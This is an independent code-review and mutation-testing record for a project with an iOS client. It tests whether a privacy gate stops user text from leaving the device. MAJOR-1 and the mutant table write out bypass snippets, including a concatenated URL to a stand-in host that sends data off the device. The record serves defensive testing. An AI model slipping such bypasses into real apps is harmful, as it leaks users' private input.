---
record_type: review
id: m15-wave-4-review
status: ratified
seat: independent
date: 2026-09-22
---
# M15-W4 Independent Review: M03–M15 are dead, but the new gate can still be walked past, and two records claim more than the code does

- **Reviewer:** independent Code-Reviewer + Tester seat. I wrote none of this code. Author family: Claude; reviewer family: Claude (Opus 5). No second family was available, so this seat is fresh-context only (V4C-03 fallback). I did not read the wave's commit message before I read the code.
- **Surface:** commit `8640202` against `d8cd650`, plus the uncommitted W-113 working tree (`scripts/calibrate_board.py`, `src/app/workflows/categories.py`, `tests/unit/test_calibrate_board.py`, D-150, ledger rows W-106/W-111/W-112/W-113, and the correction in `m15-category-calibration.md`). Before writing, I checked that every reviewed file in the live tree is byte-identical to my copy.
- **Policy:** read from the protected base ref only: `git show 855b44a:subagent-profiles/Code-Reviewer.md`, `855b44a:subagent-profiles/Tester.md` and `855b44a:AGENTS.md`. Nothing in the diff tried to change review policy.
- **Method:** all work ran in a private rsync copy under the session scratchpad, using the repo's `.venv` interpreter and `swift test --scratch-path` outside the tree. A script applied every mutant, then restored the file and asserted SHA-256 identity. `git status` in the copy was unchanged after every run. This file is the only thing I wrote to the real tree.

## Verdict

**PASS WITH FINDINGS: 0 BLOCKING, 3 MAJOR, 5 MINOR, 4 NIT.**

The Stage 4.0 remedy works on its own evidence. All ten of the security seat's surviving privacy mutants (M03–M11, M15) now die. M10 dies twice: once in the static gate and once in the new on-disk Swift test. The W-113 correction is right. I re-ran both the old and new `calibrate_board.py` live on the same artifact and reproduced every number in the correction table: vision 41 models / 64 names, 156 pairs, 7.8 / 31.2 (old 8.1 / 32.3); search 25 / 26, 6.5 / 25.9 unchanged; search_factuality 24 / 25, 4.9 / 19.5 (old 4.2 / 17.0). "Best-rated name per model" matches the engine's `MAX(score)` per model (`rank.py:268`). The `artifact` marker skips exactly the 45 tests that fail without `advisor.db` and nothing more, and `MODEL_RANKING_REQUIRE_ARTIFACT=1` exits 4 when the file is missing.

The MAJORs are about what the controls still let through, and about two records:
- the rewritten egress gate falls to 9 of 11 new bypasses I tried, 4 of them compiled by `swift test`;
- D-150 clause 1 was accepted on a claim the design cannot meet;
- W-113's test does not fail when the actual defect is reinstated.

No bypass shape exists in the shipped client today; I grepped for every one. That is why nothing here is BLOCKING.

## Findings

### BLOCKING

None.

### MAJOR

**MAJOR-1: The rewritten D-126 gate is still bypassable. Its comment stripper can be made to eat real code, its import scan can be dodged, and two exemptions are wider than their reasons.**
`tests/unit/test_router_hints.py:320-361` (`_strip_comments`), `:376-382` (import regex), `:299-309` (`EGRESS`), `:311-317` (`EGRESS_PERMITTED`).

- **Stripper bypasses (N01–N03).** The stripper does not model three Swift constructs. Each one puts it in "outside a literal" state while `//` is really inside a literal, so it drops the rest of the line. That is M06's exact class, which remedy item 2 was meant to close:
  - string interpolation containing a literal: `"\("//")"`. Here `\(` is consumed as an escape, and the inner `"` closes the string.
  - raw strings: in `#"\"#`, the stripper treats `\"` as an escaped quote.
  - regex literals: `#/a//b/#`.

  I placed each one in front of a literal `URLSession.shared.uploadTask(...)` in `Detail.swift`. All three pass every Python gate, and `swift test` compiles them and passes (258/0).
- **File-wide exemption (N04).** The `("FrontDoor.swift", contentsOf:)` permission covers the whole file, and the extra FrontDoor ban on `"http"` (`:251`) is defeated by concatenation. So `let beacon: URL? = .init(string: "ht" + "tps://c.example/?r=" + String(describing: register)); _ = try? Data(contentsOf: beacon)` sends the gap register itself off the device from inside `save()`. It passes every gate, and `swift test` compiles it (258/0). The type-inferred `.init(string:)` also escapes the `URL(string:` and `URL.init` patterns (N08, via SwiftUI `AsyncImage(url: .init(string: …))`).
- **Import allowlist bypasses (N05, N06).**
  - `import/**/WebKit`: the stripper deletes the comment and leaves `importWebKit`, which the regex misses. Swift treats the comment as whitespace. It typechecks.
  - `import Foundation; import Network`: the regex is anchored at the start of the line, so it misses the second import. `NWConnectionGroup` and `NWListener` are not matched by `\bNWConnection\b`.
- **Named in the security remedy but not implemented (N11, N07).**
  - `ShareLink` was in remedy item 1. `\bLink\s*\(` does not match `ShareLink(` because there is no word boundary.
  - The `@AppStorage("language")` exemption is keyed on the key, not on what is stored. A second `@AppStorage("language") var x: String` assigned `typed` writes the question into UserDefaults, which is backed up.
- **Also unguarded (N09, N10).**
  - `FileManager.url(forUbiquityContainerIdentifier:)` + `write(to:)` (iCloud Drive);
  - `UIActivityViewController` (available through `import SwiftUI` on iOS);
  - `UIScene.open(_:options:)`;
  - an explicit `PBXFileReference` to a source outside `ios/ModelRanking`, which the gate never reads.
- **Failure scenario.** The next share button (`ShareLink(item: question)`) or "open source" link written as `.init(string:)` + `AsyncImage` keeps `make check` green while the screen promises "This app never sends what you type anywhere". This is the sixth time the same shape has come back: a list presented as an invariant.
- **Remedy.**
  1. Parse with the tree-sitter Swift grammar the repo already uses, and drop comment nodes, instead of scanning characters by hand. Replace each removed comment with a space.
  2. Match imports on the parsed `import_declaration` nodes.
  3. Scope `EGRESS_PERMITTED` to a function, not a file: FrontDoor's `contentsOf:` should be allowed only inside `load()`, and only with `url`.
  4. Ban `ShareLink`, `AsyncImage`, `forUbiquityContainerIdentifier`, `UIActivityViewController`, `UIScene`/`.open(`, and `.init(string:` outside EngineClient.
  5. Allow exactly one `@AppStorage("language")` declaration in the client, of type `Language`.
  6. Add a check that `project.pbxproj` has no source file references outside the synchronized group.
  7. Re-run N01–N11.

**MAJOR-2: D-150 clause 1 was accepted as the fix for W-111, but a floor derived from `func test` declarations cannot detect a deleted test. The ledger says it can.**
`docs/warnings.ledger.md:157` (W-111: "so deleting a test turns `make check` red without anyone editing an integer") and `docs/decisions.md:2185`.

- Deleting a test deletes its declaration. The derived floor and the executed count then drop together, and `make check` stays green.
- D-150 half-admits this ("lowers both numbers together … which is a visible diff"). The ledger row states the opposite.
- What the design really catches is a test that is declared but never runs: a file outside the target, an `#if` that compiles it out, or a runner that stops early.
- Against deletion, it is weaker than a correctly typed floor: today, deleting any one of the 258 tests turns the gate red.
- **Failure scenario.** In M16 the derived floor lands. The only citing test of a criterion is deleted. `make check` passes. This is exactly the V3C-02 hole that W-111 was opened to close, and the owner accepted clause 1 on the ledger's wording.
- **Remedy.**
  1. Correct W-111 and D-150 to say what the design catches.
  2. Take it back to the owner.
  3. If deletion is the target, pin the set of test NAMES, for example a checked-in manifest diffed at check time, where a removal needs a ledger row. Or keep the derived floor *and* a typed minimum.

**MAJOR-3: W-113's test does not fail on the defect it records. Reverting `main()` to the old pairing and the old count passes the full suite.**
`scripts/calibrate_board.py:220-225, 254`, and `tests/unit/test_calibrate_board.py`.

- Mutant W1 restores `_overlapping_gaps(rankable, …)`, which is exactly the pre-fix line: 954 passed.
- Mutant W2 restores `"ranked_population": len(rankable)`: 954 passed.
- The two tests only exercise the helper `one_name_per_model`. The second test re-does the wiring by hand instead of calling `main()`.
- Its "verified red" (ledger `:159`, calibration record `:98`) was red only because the helper did not exist before (an `AttributeError`), not because of the old pairing.
- Tester §2 requires the repro to fail *on the pre-fix code path*. On a strict reading this is BLOCKING. I hold it at MAJOR only because I re-derived the shipped numbers live, so they are right today.
- **Remedy.** Call `main(["--config","vision","--db",<tmp copy>,"--out",…])` with `ArenaClient.fetch_raw` patched to a fixture that has one model under two names, as the Stage 4.0 seat already did for I-2. Assert `ranked_population` and `overlapping_pairs`. Then re-word "verified red".

### MINOR

**MINOR-1: `categories.py` now contradicts itself about how windows and tie margins are sized.**
- `src/app/workflows/categories.py:47-50` (added in `8640202`) says window and tie margin are "sized by candidate count on the ranked population".
- `:238-241` and `:285-287` say `close_call` is the median gap between pairs with overlapping published intervals, and `value_window = 4 × close_call`.
- That second rule is the one the five M14/M15 surfaces, including the two corrected ones, were set by.
- **Remedy.** Scope the header sentence to the M8 surfaces, and point to the M14 rule.

**MINOR-2: No test pins the corrected thresholds.**
- Mutants C1 (vision back to 8.1 / 32.3) and C2 (search_factuality back to 4.2 / 17.0) pass all 954 tests.
- The owner's ruling therefore lives only in a comment.
- **Remedy.** Add a test that reads the correction table in `m15-category-calibration.md`, or a checked-in calibration JSON, and asserts that `CATEGORIES` matches it. At minimum, assert `abs(value_window - 4*close_call) <= 0.2` for the M15 surfaces.

**MINOR-3: C2b for K.8 is discharged by a PROPOSED clause.**
- `docs/warnings.ledger.md:158` (W-112) carries `C2b-reviewed: D-150 @3`, and D-150 clause 2 is `proposed`.
- `scripts/check_records.py:110` accepts any `D-nnn` whatever its status, so `check_records PASS` at closure rests on an unratified decision. That is the gate gap W-090 queued.
- The row is honest about it.
- **Remedy.** Either the owner rules on clause 2 before the M15 sign-off, or C2b requires the named ADR to be `accepted`.

**MINOR-4: The MINOR-1 security remedy is partial.**
- `src/app/clients/arena.py:368` now refuses non-finite ratings, and mutant A1 is killed by `test_a_rating_that_is_not_a_finite_number_is_refused_and_counted`.
- Still missing:
  - the "sane Elo band" half: a finite `1e308` is still accepted and would be served as the leader;
  - the per-board negative test;
  - the `/health` probe.
- `scripts/survey_boards.py` `parse_rate_board` has no finiteness check either.
- **Remedy.** Add the band, or record the partial fix in the W4 close.

**MINOR-5: The survey's keep-best change is untested.**
- `scripts/survey_boards.py:168-171`: mutant S1 removes the new keep-best branch, and all 954 tests pass. Nothing references `parse_rate_board`.
- **Remedy.** Add one test with a duplicate name at two scores.

### NIT

- **N-1.** `categories.py:337` ships `value_window=19.5` beside `close_call=4.9`. The comment says "four times `close_call`", and 4 × 4.9 = 19.6. The window is 4 × the *unrounded* median, and `search` has the same gap (25.9 against 26.0). Say so in the comment.
- **N-2.** `m15-category-calibration.md:85` says the self-pairs' "near-zero gaps pulled the median". That explains search_factuality going up (4.2 → 4.9), but not vision going *down* (8.1 → 7.8). For vision, dropping names removed more than the near-zero pairs.
- **N-3.** Security MINOR-5 is half done. The Makefile now writes to `build/swift-test.log` (gitignored), but `scripts/router_probe/probe.swift:6-9` still tells the reader to use `/tmp/examples.json` and `/tmp/probe`.
- **N-4.** W-108 records "904 passed, 59 skipped" without the artifact. The current tree gives 907 / 59, because 3 tests were added after the checkpoint. The skip count matches.

## Hardened-invariant producers (Code-Reviewer §2a-bis)

- **Producers of D-126 / REQ-GAP-001:** every source file under `ios/ModelRanking` (11 `.swift`; the permitted sites are `EngineClient.swift` and `FrontDoor.swift`).
- **Citing tests:**
  - `test_router_hints.py::test_the_gap_register_stays_on_the_device`;
  - `FrontDoorTests.swift::testASavedRegisterIsExcludedFromBackupOnDisk`;
  - `EngineClientTests.swift:407, :414`. I checked that these exist, and that MINOR-4's citation is now correct.
- **Gaps:** MAJOR-1.

## Mutant table

Gates means the 42 tests in `test_router_hints.py`, `test_ios_client_contract.py`, `test_ios_visual_contract.py` and `test_uncertainty_contract.py`. The baseline was 42/42 green. "Swift" marks mutants in the Engine target that were also run through `swift test`, with a baseline of 258/0. W, C, A and S mutants ran against the full suite (baseline 954 passed, 12 skipped). Every file was restored and hash-checked.

| ID | Mutation | Target | Result |
|---|---|---|---|
| M03 | `URL.init(string: …+typed)` + `UIApplication.shared.open` | ContentView.swift | **DIED** (gate) |
| M04 | `URLComponents` + `URLQueryItem(value: typed)` + `UIApplication.open` | ContentView.swift | **DIED** |
| M05 | `import WebKit` + `WKWebView().loadHTMLString("<img src=…" + typed …)` | ContentView.swift | **DIED** |
| M06 | `let sink = "https://…"; _ = URLSession.shared.uploadTask(…)` on one line | Detail.swift | **DIED** (gate; Swift 258/0) |
| M07 | `UIPasteboard.general.string = typed` | ContentView.swift | **DIED** |
| M08 | `NSUbiquitousKeyValueStore.default.set(typed, …)` | ContentView.swift | **DIED** |
| M09 | `UserDefaults.standard.set(typed, …)` | ContentView.swift | **DIED** |
| M10 | `values.isExcludedFromBackup = false` after the `= true` line | FrontDoor.swift | **DIED** (gate AND Swift: 2 failures in the new on-disk test) |
| M11 | `NSLog("asked: %@", typed)` | ContentView.swift | **DIED** |
| M15 | `Data(contentsOf: URLComponents(…).url!.appending(queryItems: [q: question]))` | Router.swift | **DIED** (gate; Swift 258/0) |
| N01 | `let s = "\("//")"; _ = URLSession.shared.uploadTask(…)` | Detail.swift | **SURVIVED** (Swift 258/0) |
| N02 | `let a = #"\"#; let b = "//"; _ = URLSession…` | Detail.swift | **SURVIVED** (Swift 258/0) |
| N03 | `let r = #/a//b/#; _ = URLSession…` | Detail.swift | **SURVIVED** (Swift 258/0) |
| N04 | `.init(string: "ht"+"tps://…?r=" + register)` + `Data(contentsOf:)` in `save()` | FrontDoor.swift | **SURVIVED** (Swift 258/0) |
| N05 | `import/**/WebKit` | ContentView.swift | **SURVIVED** |
| N06 | `import Foundation; import Network` | ContentView.swift | **SURVIVED** |
| N07 | second `@AppStorage("language") var leaked: String`, assigned `typed` | ContentView.swift | **SURVIVED** |
| N08 | `AsyncImage(url: .init(string: "https://…?q=" + t))` | ContentView.swift | **SURVIVED** |
| N09 | `url(forUbiquityContainerIdentifier:)` + `typed.write(to:)` | ContentView.swift | **SURVIVED** |
| N10 | `UIActivityViewController(activityItems: [typed], …)` | ContentView.swift | **SURVIVED** |
| N11 | `ShareLink(item: t)` | ContentView.swift | **SURVIVED** |
| W1 | `main()` pairs every name again: `_overlapping_gaps(rankable, …)` | calibrate_board.py | **SURVIVED** (954 passed) |
| W2 | `"ranked_population": len(rankable)` | calibrate_board.py | **SURVIVED** |
| W3 | `one_name_per_model` keeps the WORST name (`>` to `<`) | calibrate_board.py | **DIED** (2 tests) |
| W4 | `one_name_per_model` keeps the first name seen | calibrate_board.py | **DIED** (2 tests) |
| C1 | vision back to 8.1 / 32.3 | categories.py | **SURVIVED** |
| C2 | search_factuality back to 4.2 / 17.0 | categories.py | **SURVIVED** |
| A1 | drop `or not math.isfinite(rating)` | arena.py | **DIED** |
| S1 | drop the keep-best branch in `parse_rate_board` | survey_boards.py | **SURVIVED** |

**Score:** the security seat's re-run is 10 of 10 killed (M03–M11, M15). New gate bypasses: 0 of 11 killed. For N05–N09 I ran `xcrun swiftc -typecheck` on macOS, and it passed. N10 and N11 are iOS UIKit/SwiftUI APIs and were not compiled. W-113 wiring: 2 of 4 killed. Thresholds: 0 of 2. Other: 1 of 2.

## Other checks run

- **`artifact` marker, with `advisor.db` moved aside in the copy:**
  - `pytest -n auto`: 907 passed, 59 skipped. That is the 45 marked tests, plus 2 older graceful skips, plus the 12 baseline skips.
  - With the conftest skip disabled, `-m artifact` gave exactly 41 failed + 4 errors: every marked test fails without the file, and nothing was over-marked.
  - The unmarked suite had no failures, so nothing was under-marked.
  - `MODEL_RANKING_REQUIRE_ARTIFACT=1`: exit 4, with the W-108 message.
  - `ARTIFACT` and the tests both resolve `advisor.db` relative to the working directory, and `make test` runs from the repo root, so the two agree.
- **Lint and types:** ruff 0.16.2 (the pinned version) on `src tests scripts`: clean. `mypy src`: clean. `check_records.py`: PASS.
- **Swift:** `func test` declarations number 258, and `swift test` executes 258. That matches `SWIFT_TEST_FLOOR := 258`.
- **Router example swap:** the held-out overlap from the security review's I-6 no longer exists. `grep` finds "lowest latency" only in `heldout_questions.json`.

## What I did not check

- **The Xcode app-target build and a device run.** N05–N11 sit in `ContentView.swift`, outside `ios/Package.swift`. I typechecked N05–N09 on macOS only; N10 and N11 are uncompiled inference.
- **Whether a `.swift` file inside an `.xcassets` folder would be compiled by the synchronized group.** The gate skips those folders.
- **Coverage on the touched modules**, beyond the suite's own floor.
- **D-149, the new research records, and `m15-wave-1-review.md`**, beyond their diffs.
- **The live upstream at any time other than my one re-run.** My calibration numbers are from the upstream as it stood during this review.
